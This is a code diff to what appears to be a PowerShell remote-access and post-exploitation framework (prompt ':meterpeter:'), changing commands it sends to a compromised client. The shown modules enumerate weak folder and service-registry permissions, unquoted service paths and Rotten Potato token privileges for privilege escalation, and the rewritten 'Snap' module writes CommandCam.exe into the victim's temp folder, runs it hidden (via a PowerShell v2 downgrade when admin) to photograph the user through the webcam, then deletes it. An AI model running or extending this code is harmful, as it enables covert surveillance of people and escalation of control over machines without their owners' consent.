@@ -456,9 +456,9 @@ While($Client.Connected)
         write-host "   -------   -----------                     -------";
         write-host "   Check     Retrieve Folder Privileges      Client:User  - Privileges Required";
         write-host "   WeakDir   Search weak privs recursive     Client:User  - Privileges Required";
-        write-host "   RegPerm   Services registry permissions   Client:User  - Privileges Required";
         write-host "   Service   Search Unquoted Service Paths   Client:User  - Privileges Required";
         write-host "   RottenP   Search For rotten potato vuln   Client:User  - Privileges Required";
+        write-host "   RegACL    Insecure Registry Permissions   Client:User  - Privileges Required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Adv:Priv> " -NoNewline -ForeGroundColor Green;
         $my_choise = Read-Host;
@@ -483,11 +483,6 @@ While($Client.Connected)
           If(-not ($User_Attr) -or $User_Attr -eq " "){$User_Attr = "Everyone:"};
           $Command = "icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /C:`"$User_Attr`"|findstr /C:`"($Attrib)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   [i] None Weak Folders Permissions Found [ $User_Attr($Attrib) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
        }
-        If($my_choise -eq "RegPerm" -or $my_choise -eq "Perm")
-        {
-          write-host " List Remote-Host Services registry permissions." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "get-acl HKLM:\System\CurrentControlSet\services\*|Select-Object PSChildName,Owner,AccessToString|format-list `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
-        }
         If($my_choise -eq "Service" -or $my_choise -eq "service")
         {
           write-host " List Remote-Host Unquoted Service Paths." -ForegroundColor Blue -BackgroundColor White;
@@ -500,6 +495,11 @@ While($Client.Connected)
           write-host " https://areyou1or0.blogspot.com/2019/06/rotten-potato-privilege-escalation-by.html" -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   [i] Client:Admin Detected, this module cant run with admin Privileges`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{cmd /R whoami /priv|findstr /i /C:`"SeImpersonatePrivilege`" /C:`"SeAssignPrimaryPrivilege`" /C:`"SeTcbPrivilege`" /C:`"SeBackupPrivilege`" /C:`"SeRestorePrivilege`" /C:`"SeCreateTokenPrivilege`" /C:`"SeLoadDriverPrivilege`" /C:`"SeTakeOwnershipPrivilege`" /C:`"SeDebugPrivileges`" `> dellog.txt;`$check_ACL = get-content dellog.txt|findstr /i /C:`"Enabled`";If(`$check_ACL){echo `"[i] Rotten Potato Vulnerable Settings Found [Enabled] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Get-Content dellog.txt;remove-item dellog.txt -Force}else{echo `"   [i] None Weak Permissions Found [ Rotten Potato ] ..`" `> test.txt;Get-Content test.txt;Remove-Item test.txt -Force;Remove-Item dellog.txt -Force}}";
        }
+        If($my_choise -eq "RegACL" -or $my_choise -eq "acl")
+        {
+          write-host " List Remote-Host Services registry permissions." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "get-acl HKLM:\System\CurrentControlSet\services\*|Select-Object PSChildName,Owner,AccessToString,Path|format-list `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+        }
         If($my_choise -eq "Return" -or $my_choise -eq "return" -or $my_choise -eq "cls" -or $my_choise -eq "Modules" -or $my_choise -eq "modules" -or $my_choise -eq "clear")
         {
           $RfPath = $Null;
@@ -884,7 +884,7 @@ While($Client.Connected)
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     ------";
         write-host "   Device    List WebCam Devices             Client:User  - Privileges required";
-        write-host "   Snap      Take WebCam Screenshot          Client:User  - Privileges required";
+        write-host "   Snap      Take WebCam Screenshot          Client:User:Admin  - Privs required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Snap> " -NoNewline -ForeGroundColor Green;
         $Cam_choise = Read-Host;
@@ -898,7 +898,8 @@ While($Client.Connected)
             $FileBytes = "($FileBytes)";
             $File = $File.Split('\')[-1];
             $File = $File.Split('/')[-1];
-            $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}";
+            #$Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}";
+            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";powershell -version 2 Start-Process -FilePath `$env:tmp\CommandCam.exe /quiet -WindowStyle Hidden;Start-Sleep -Seconds 3;cmd /R del /Q /F %tmp%\CommandCam.exe}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`";cmd /R start /min %tmp%\CommandCam.exe /quiet;cmd /R del /Q /F %tmp%\CommandCam.exe}}";
             $Command = $Command -replace "#","$File";
             $Command = $Command -replace "@","$FileBytes";
             $Camflop = "True";
@@ -1591,10 +1592,10 @@ While($Client.Connected)
         {
           If($Cam_set -eq "True")
           {
-            $OutPut = $OutPut -replace "`n","";$final = $OutPut -replace "WebCamCommandCam.exe","";
+            $OutPut = $OutPut -replace "`n","";
             write-host "`n`n  WebCam(s) Detected" -ForeGroundColor Green;
             write-host "  ------------------";
-            Write-Host "  $final";
+            Write-Host "  $OutPut";
             $Cam_set = "False";
           }else{
             $OutPut = $OutPut -replace "`n","";
